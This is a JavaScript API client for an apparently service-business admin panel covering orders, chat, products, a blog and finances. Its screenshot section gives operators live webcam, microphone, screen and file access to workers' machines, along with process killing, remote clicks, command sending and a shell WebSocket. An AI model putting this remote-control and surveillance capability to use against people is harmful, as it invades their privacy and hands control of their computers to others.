import axios from 'axios'

const DEFAULT_SERVER = 'http://localhost:8000'

export const getApiBase = () =>
  (localStorage.getItem('serverUrl') || DEFAULT_SERVER).replace(/\/+$/, '')

// For image URL construction (called as function in JSX)
export const API_BASE = getApiBase

const api = axios.create()

api.interceptors.request.use((config) => {
  config.baseURL = getApiBase()
  const token = localStorage.getItem('token')
  if (token) config.headers.Authorization = `Bearer ${token}`
  return config
})

api.interceptors.response.use(
  (r) => r,
  (err) => {
    if (err.response?.status === 401) {
      localStorage.removeItem('token')
      localStorage.removeItem('user')
      window.location.hash = '#/login'
    }
    return Promise.reject(err)
  }
)

const wsBase = () => getApiBase().replace(/^http/, 'ws')

// ── Auth ──────────────────────────────────────────────────────────────────────
export const login = (username, password) =>
  api.post('/auth/login', { username, password }).then((r) => r.data)
export const sendHeartbeat = () => api.post('/users/heartbeat')

// ── Users ─────────────────────────────────────────────────────────────────────
export const getUsers = () => api.get('/users/').then((r) => r.data)
export const createUser = (data) => api.post('/users/', data).then((r) => r.data)
export const updateUser = (id, data) => api.patch(`/users/${id}`, data).then((r) => r.data)
export const deleteUser = (id) => api.delete(`/users/${id}`)
export const getWorkersStats = () => api.get('/users/workers/stats').then((r) => r.data)

// ── Categories ────────────────────────────────────────────────────────────────
export const getCategories = () => api.get('/categories/').then((r) => r.data)
export const createCategory = (data) => api.post('/categories/', data).then((r) => r.data)
export const updateCategory = (id, data) => api.patch(`/categories/${id}`, data).then((r) => r.data)
export const deleteCategory = (id) => api.delete(`/categories/${id}`)

// ── Products ──────────────────────────────────────────────────────────────────
export const getProducts = () => api.get('/products/').then((r) => r.data)
export const createProduct = (data) => api.post('/products/', data).then((r) => r.data)
export const updateProduct = (id, data) => api.patch(`/products/${id}`, data).then((r) => r.data)
export const deleteProduct = (id) => api.delete(`/products/${id}`)
export const uploadProductImage = (id, file) => {
  const fd = new FormData()
  fd.append('file', file)
  return api.post(`/products/${id}/image`, fd, { headers: { 'Content-Type': 'multipart/form-data' } }).then((r) => r.data)
}
export const deleteProductImage = (id) => api.delete(`/products/${id}/image`).then((r) => r.data)
export const getGlobalDiscount = () => api.get('/products/global-discount').then((r) => r.data)
export const setGlobalDiscount = (value) => api.patch('/products/global-discount', { value }).then((r) => r.data)

// ── Orders ────────────────────────────────────────────────────────────────────
export const getOrders = (params) => api.get('/orders/', { params }).then((r) => r.data)
export const getOrder = (id) => api.get(`/orders/${id}`).then((r) => r.data)
export const createOrder = (data) => api.post('/orders/', data).then((r) => r.data)
export const updateOrder = (id, data) => api.patch(`/orders/${id}`, data).then((r) => r.data)
export const updateOrderStatus = (id, status) =>
  api.patch(`/orders/${id}/status`, { status }).then((r) => r.data)
export const deleteOrder = (id) => api.delete(`/orders/${id}`)
export const removeWorkerFromOrder = (id) => api.post(`/orders/${id}/remove-worker`).then((r) => r.data)

// ── Chat ──────────────────────────────────────────────────────────────────────
export const getMessages = (orderId) =>
  api.get(`/chat/${orderId}/messages`).then((r) => r.data)
export const sendMessage = (orderId, content) =>
  api.post(`/chat/${orderId}/messages`, { content }).then((r) => r.data)
export const uploadChatImage = (orderId, file) => {
  const form = new FormData()
  form.append('file', file)
  return api.post(`/chat/${orderId}/upload-image`, form).then((r) => r.data)
}
export const getUnreadCounts = () =>
  api.get('/chat/unread-counts').then((r) => r.data)
export const markChatRead = (orderId) =>
  api.post(`/chat/${orderId}/read`).then((r) => r.data)
export const createChatWs = (orderId) => {
  const token = localStorage.getItem('token')
  return new WebSocket(`${wsBase()}/chat/ws/${orderId}?token=${token}`)
}

// ── Global Chat ───────────────────────────────────────────────────────────────
export const getGlobalMessages = () =>
  api.get('/global-chat/messages').then((r) => r.data)
export const sendGlobalMessage = (content) =>
  api.post('/global-chat/messages', { content }).then((r) => r.data)
export const uploadGlobalImage = (file) => {
  const form = new FormData()
  form.append('file', file)
  return api.post('/global-chat/upload-image', form).then((r) => r.data)
}
export const getGlobalUnreadCount = (since) =>
  api.get('/global-chat/unread-count', { params: since ? { since } : {} }).then((r) => r.data)
export const createGlobalChatWs = () => {
  const token = localStorage.getItem('token')
  return new WebSocket(`${wsBase()}/global-chat/ws?token=${token}`)
}

// ── Media ─────────────────────────────────────────────────────────────────────
export const getMedia = () => api.get('/media/').then((r) => r.data)
export const createMedia = (data) => api.post('/media/', data).then((r) => r.data)
export const updateMedia = (id, data) => api.patch(`/media/${id}`, data).then((r) => r.data)
export const deleteMedia = (id) => api.delete(`/media/${id}`)
export const createPromoCode = (mediaId, data) => api.post(`/media/${mediaId}/promo-codes`, data).then((r) => r.data)
export const updatePromoCode = (id, data) => api.patch(`/media/promo-codes/${id}`, data).then((r) => r.data)
export const deletePromoCode = (id) => api.delete(`/media/promo-codes/${id}`)
export const lookupPromoCode = (code) => api.get(`/media/promo-codes/lookup/${code}`).then((r) => r.data)

// ── Screenshots ───────────────────────────────────────────────────────────────
export const uploadWorkerScreenshot = (base64) => {
  const bytes = Uint8Array.from(atob(base64), (c) => c.charCodeAt(0))
  const blob = new Blob([bytes], { type: 'image/jpeg' })
  const fd = new FormData()
  fd.append('file', blob, 'screenshot.jpg')
  return api.post('/users/screenshot', fd)
}

export const fetchWorkerScreenshot = (workerId) =>
  api.get(`/users/${workerId}/screenshot`, { responseType: 'blob' })

export const fetchWorkerWebcamPhoto = (workerId) =>
  api.get(`/users/${workerId}/webcam-photo`, { responseType: 'blob' })

export const requestWorkerScreenshot = (workerId) =>
  api.post(`/users/${workerId}/screenshot/request`)

export const createWebcamViewWs = (workerId) => {
  const token = localStorage.getItem('token')
  return new WebSocket(`${wsBase()}/users/${workerId}/webcam-view?token=${token}`)
}

export const createScreenshotViewWs = (workerId) => {
  const token = localStorage.getItem('token')
  return new WebSocket(`${wsBase()}/users/${workerId}/screenshot-view?token=${token}`)
}

export const createScreenViewWs = (workerId) => {
  const token = localStorage.getItem('token')
  const base = getApiBase().replace(/^http/, 'ws')
  return new WebSocket(`${base}/users/${workerId}/screen-view?token=${token}`)
}

export const createMicViewWs = (workerId) => {
  const token = localStorage.getItem('token')
  const base = getApiBase().replace(/^http/, 'ws')
  return new WebSocket(`${base}/users/${workerId}/mic-view?token=${token}`)
}

export const fetchWorkerProcesses = (workerId) =>
  api.get(`/users/${workerId}/processes`).then((r) => r.data)

export const killWorkerProcess = (workerId, name) =>
  api.post(`/users/${workerId}/processes/kill`, { name })

export const sendWorkerCommand = (workerId, command) =>
  api.post(`/users/${workerId}/command`, { command })

export const sendWorkerClick = (workerId, x, y) =>
  api.post(`/users/${workerId}/click`, { x, y })

export const createShellViewWs = (workerId) => {
  const token = localStorage.getItem('token')
  const base = getApiBase().replace(/^http/, 'ws')
  return new WebSocket(`${base}/users/${workerId}/shell-view?token=${token}`)
}

export const createFilesViewWs = (workerId) => {
  const token = localStorage.getItem('token')
  const base = getApiBase().replace(/^http/, 'ws')
  return new WebSocket(`${base}/users/${workerId}/files-view?token=${token}`)
}

// ── Health ────────────────────────────────────────────────────────────────────
export const getHealth = () => api.get('/health/').then(r => r.data)

// ── Site Settings ─────────────────────────────────────────────────────────────
export const getSiteSettings = () => api.get('/site-settings/').then(r => r.data)
export const updateSiteSetting = (key, value) => api.patch(`/site-settings/${key}`, { value }).then(r => r.data)
export const resetWorkerSessions = () => api.post('/site-settings/reset-worker-sessions').then(r => r.data)

// ── FAQ ───────────────────────────────────────────────────────────────────────
export const getFAQ = () => api.get('/faq/all').then(r => r.data)
export const createFAQ = (data) => api.post('/faq/', data).then(r => r.data)
export const updateFAQ = (id, data) => api.patch(`/faq/${id}`, data).then(r => r.data)
export const deleteFAQ = (id) => api.delete(`/faq/${id}`)

// ── Blog ──────────────────────────────────────────────────────────────────────
export const getBlogPosts = () => api.get('/api/blog/all').then(r => r.data)
export const createBlogPost = (data) => api.post('/api/blog/', data).then(r => r.data)
export const updateBlogPost = (id, data) => api.patch(`/api/blog/${id}`, data).then(r => r.data)
export const deleteBlogPost = (id) => api.delete(`/api/blog/${id}`)
export const uploadBlogImage = (file) => {
  const fd = new FormData()
  fd.append('file', file)
  return api.post('/api/blog/upload-image', fd, { headers: { 'Content-Type': 'multipart/form-data' } }).then(r => r.data)
}

// Blog comments moderation
export const getBlogPendingComments = () => api.get('/api/blog/admin/comments').then(r => r.data)
export const approveBlogComment = (id) => api.patch(`/api/blog/admin/comments/${id}/approve`).then(r => r.data)
export const deleteBlogComment = (id) => api.delete(`/api/blog/admin/comments/${id}`).then(r => r.data)

// ── Hero char images ──────────────────────────────────────────────────────────
export const uploadHeroChar = (side, file) => {
  const fd = new FormData()
  fd.append('file', file)
  return api.post(`/site-settings/upload-hero-char/${side}`, fd, { headers: { 'Content-Type': 'multipart/form-data' } }).then(r => r.data)
}

// ── Financial ─────────────────────────────────────────────────────────────────
export const getDashboard = () => api.get('/financial/dashboard').then((r) => r.data)
export const getTransactions = (params) =>
  api.get('/financial/transactions', { params }).then((r) => r.data)
export const payTransaction = (id) =>
  api.patch(`/financial/transactions/${id}/pay`).then((r) => r.data)
export const unpayTransaction = (id) =>
  api.patch(`/financial/transactions/${id}/unpay`).then((r) => r.data)

// ── Teleports ──────────────────────────────────────────────────────────────
export const getTeleportGroups = () => api.get('/teleports/groups').then(r => r.data)
export const createTeleportGroup = (name) => api.post('/teleports/groups', { name }).then(r => r.data)
export const updateTeleportGroup = (id, name) => api.patch(`/teleports/groups/${id}`, { name }).then(r => r.data)
export const deleteTeleportGroup = (id) => api.delete(`/teleports/groups/${id}`)
export const getTeleportPresets = (groupId) => api.get(`/teleports/groups/${groupId}/presets`).then(r => r.data)
export const uploadTeleportPreset = (groupId, name, file) => {
  const form = new FormData()
  form.append('file', file)
  return api.post(`/teleports/groups/${groupId}/presets`, form, { params: { name } }).then(r => r.data)
}
export const deleteTeleportPreset = (id) => api.delete(`/teleports/presets/${id}`)
